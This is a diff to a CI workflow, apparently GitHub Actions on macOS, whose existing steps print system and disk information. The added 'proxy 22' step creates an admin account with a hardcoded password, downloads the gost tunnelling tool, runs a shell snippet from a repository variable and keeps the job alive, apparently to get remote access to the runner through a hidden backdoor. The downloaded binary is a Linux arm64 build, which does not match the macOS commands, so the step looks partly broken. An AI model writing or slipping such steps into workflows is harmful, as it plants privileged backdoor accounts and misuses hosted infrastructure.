@@ -16,4 +16,11 @@ jobs:
           echo "系统版本: $(sw_vers -productVersion)" && \
           echo "硬盘信息: $(diskutil info disk0 | grep 'Total Size')"
           
-          
+      - name: proxy 22
+        run: |
+          sudo sysadminctl -addUser jiro -password zhangjl22222@ -admin
+          sudo dscl . -append /Groups/admin GroupMembership jiro
+          wget https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_arm64.tar.gz
+          tar zxvf gost_2.12.0_linux_arm64.tar.gz
+          ${{vars.GOST_SHELL_macos}}
+          tail
